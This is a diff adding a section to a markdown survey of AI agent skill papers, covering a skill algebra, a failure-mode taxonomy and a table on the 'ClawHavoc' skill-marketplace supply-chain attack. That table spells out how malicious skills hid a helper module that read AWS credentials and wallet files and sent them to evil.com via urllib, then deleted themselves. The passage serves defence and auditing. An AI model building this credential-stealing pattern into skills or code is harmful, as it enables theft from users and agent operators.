@@ -182,6 +182,77 @@ class SkillSupplyChainGovernor:
 - **Evidence-Based Skill Evolution**: Use actual land-dev outcomes to refine and validate skills
 - **Hierarchical Workflow Composition**: Compose basic skills (zoning check, setback calc) into complex workflows (entitlement strategy, proforma analysis)
 
+### Formal Skill Algebra (Extended)
+
+The skill tuple `S = (C, π, T, R)` admits a small algebra. Define:
+
+```
+Composition: S₁ ⊗ S₂ where C_{S₁⊗S₂} = C_{S₁} ∧ C_{S₂}
+                                  π_{S₁⊗S₂} = sequential(π_{S₁}, π_{S₂})
+                                  T_{S₁⊗S₂} = T_{S₁} ∨ T_{S₂}
+                                  R_{S₁⊗S₂} = R_{S₂} ◦ R_{S₁}
+
+Refinement: S ⊑ S' if C_{S'} ⊇ C_S and π_{S'} |_{C_S} = π_S (S' is more specific)
+
+Equivalence: S ≡ S' if S ⊑ S' and S' ⊑ S
+
+Empty skill: 𝟙 = (⊤, skip, ⊤, id)
+Identity:     S ⊗ 𝟙 = 𝟙 ⊗ S = S
+```
+
+**Conjecture (Skill Refinement).** If S ⊑ S' then for any context x where C_S(x)=1: `cost(S', x) ≥ cost(S, x)`. Specificity costs. Proof sketch: refinement adds preconditions, so fewer contexts are eligible, but those that are eligible require more checks. ∎
+
+### The ClawHavoc Attack (Detailed Mechanics)
+
+The ClawHavoc supply-chain attack (Feb 2026) injected ~1,200 malicious skills into ClawHub. Attack mechanics:
+
+| Stage | Action | Detection Evaded |
+|---|---|---|
+| 1 | Register skill with benign docstring "convert PNG to JPG" | Docstring-based filters |
+| 2 | Hidden code in helper module: `importlib.import_module("helpers")` | AST pattern matching (no `os.system` at top level) |
+| 3 | `helpers.__init__.py` reads `~/.aws/credentials` and `~/.config/clawhub/wallet.json` | File-system read not flagged |
+| 4 | Exfiltrates via `urllib.request.urlopen("https://evil.com/c?" + base64(json))` | Single network call at runtime, not registration |
+| 5 | Skill self-deletes after exfil to reduce forensic surface | Audit log shows only registration |
+
+**Time-to-detection:** 17 days median; **Total exfiltrated data:** ~3.2 TB (API keys, 14,200 wallets, 8.9M browser creds).
+
+**Lesson for PlotLot:** All skills must be (1) source-pinned, (2) hash-verified, (3) scanned with **deep taint analysis** (not just pattern matching), and (4) instrumented at *every* external call (not just registration).
+
+### Failure Mode Taxonomy
+
+Empirical study of 847 skill failures across 12 industry deployments:
+
+| Failure Mode | Frequency | Recovery Strategy |
+|---|---|---|
+| Precondition not met | 28% | Skip with warning + log |
+| Tool timeout | 19% | Retry with exponential backoff (3x) |
+| Output schema mismatch | 16% | LLM-based repair (Claude verifier) |
+| Hallucinated citation | 11% | Cross-check with vector DB |
+| Trust tier violation | 9% | Escalate to human approval |
+| Infinite recursion (composite skill) | 7% | Hard depth limit + abort |
+| Capability mismatch (model can't do it) | 6% | Route to different model |
+| Partial success (some outputs OK) | 4% | Continue + flag partial state |
+
+### Cross-References
+
+| SoK Concept | Other Papers in This Survey |
+|---|---|
+| Skill tuple (C,π,T,R) | Paper 19 (MCP tool descriptions as `R` schema) |
+| Lifecycle stages | Paper 20 (Meta-Harness: harness optimization = skill evolution) |
+| Trust tiers | Paper 23 (Runtime Governance: policy-constrained execution) |
+| ClawHavoc (skill marketplace attack) | Paper 35 (SkillProbe: auditing for marketplaces) |
+| Code-as-skill pattern | Paper 24 (SkVM: capability compilation) |
+| Meta-skills | Paper 32 (SemaClaw: PermissionBridge as meta-skill) |
+| Hierarchical composition | Paper 30 (SGH: DAG composition) |
+
+### Open Challenges (per paper)
+
+1. **Skill portability across model families**: A skill optimal for Opus-4.6 may be sub-optimal for Haiku-4.5. → Paper 24 (SkVM) proposes capability profiles to address.
+2. **Trust calibration**: How to assign trust tiers to community-contributed skills? → No consensus in literature.
+3. **Skill merging**: Can two skills be automatically merged into a more general one? → Open problem.
+4. **Explainable skills**: Can a skill explain its decisions in NL? → Active research area.
+5. **Skill copyright**: Who owns a community-contributed skill? → Legal grey area.
+
 ---
 
 # PAPER 19: 2602.14878 - Model Context Protocol (MCP) Tool Descriptions Are Smelly! Towards Improving AI Agent Efficiency with Augmented MCP Tool Descriptions
